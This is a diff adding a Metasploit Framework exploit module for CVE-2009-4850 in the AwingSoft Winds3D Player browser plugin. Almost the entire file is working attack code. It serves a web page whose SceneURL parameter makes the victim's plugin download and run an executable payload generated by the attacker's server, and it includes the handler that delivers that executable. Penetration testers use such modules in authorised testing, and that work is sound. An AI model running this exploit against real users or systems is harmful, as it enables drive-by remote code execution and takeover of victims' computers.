@@ -1,0 +1,90 @@
+##
+# $Id: awingsoft_winds3d_sceneurl.rb 10389 2010-09-20 04:38:13Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+	include Msf::Exploit::EXE
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'AwingSoft Winds3D Player 3.5 SceneURL Download and Execute',
+			'Description'    => %q{
+					This module exploits an untrusted program execution vulnerability within the
+				Winds3D Player from AwingSoft. The Winds3D Player is a browser plugin for
+				IE (ActiveX), Opera (DLL) and Firefox (XPI). By setting the 'SceneURL'
+				parameter to the URL to an executable, an attacker can execute arbitrary
+				code.
+
+				Testing was conducted using plugin version 3.5.0.9 for Firefox 3.5 and
+				IE 8 on Windows XP SP3.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         =>
+				[
+					'jduck'  # original discovery & metasploit module
+				],
+			'Version'        => '$Revision: 10389 $',
+			'References'     =>
+				[
+					[ 'CVE', '2009-4850' ],
+					[ 'OSVDB', '60049' ]
+				],
+			'Payload'        =>
+				{
+					'Space'    => 2048,
+					'StackAdjustment' => -3500,
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Automatic', { }],
+				],
+			'DisclosureDate' => 'Nov 14 2009',
+			'DefaultTarget'  => 0))
+	end
+
+	def on_request_uri(cli, request)
+
+		payload_url =  "http://"
+		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/payload"
+
+		if (request.uri.match(/payload/))
+			return if ((p = regenerate_payload(cli)) == nil)
+			data = generate_payload_exe({ :code => p.encoded })
+			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
+			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
+
+			# Handle the payload
+			# handler(cli)
+			return
+		end
+
+		# otherwise, send the html..
+		html = %Q|<html>
+<body>
+<object classid='clsid:17A54E7D-A9D4-11D8-9552-00E04CB09903'
+codebase='http://www.awingsoft.com/zips/WindsPly.CAB'>
+<param name="SceneURL" value="#{payload_url}#">
+<embed type="application/x-awingsoft-winds3d" src="#{payload_url}">
+</object>
+|
+
+		print_status("Sending #{self.name} HTML to #{cli.peerhost}:#{cli.peerport}...")
+		# Transmit the compressed response to the client
+		send_response(cli, html, { 'Content-Type' => 'text/html' })
+
+	end
+end
